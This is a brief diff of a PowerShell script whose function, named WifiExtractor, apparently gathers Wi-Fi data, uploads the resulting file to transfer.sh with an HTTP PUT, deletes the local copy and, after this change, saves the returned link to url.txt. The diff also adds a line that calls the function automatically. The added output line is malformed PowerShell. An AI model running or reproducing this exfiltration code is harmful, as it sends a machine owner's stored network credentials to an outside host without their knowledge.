@@ -33,6 +33,7 @@ function WifiExtractor {
 	$url = "https://transfer.sh/" + $FinalFileName;
 	$res = Invoke-WebRequest -uri $url -Method put -InFile $FinalFileName -ContentType "multipart/form-data";
 	rm $FinalFileName
-	echo $res.Content;
-
+	$res.Content | -OutFile -FilePath url.txt;
 }
+
+WifiExtractor -FileName collector
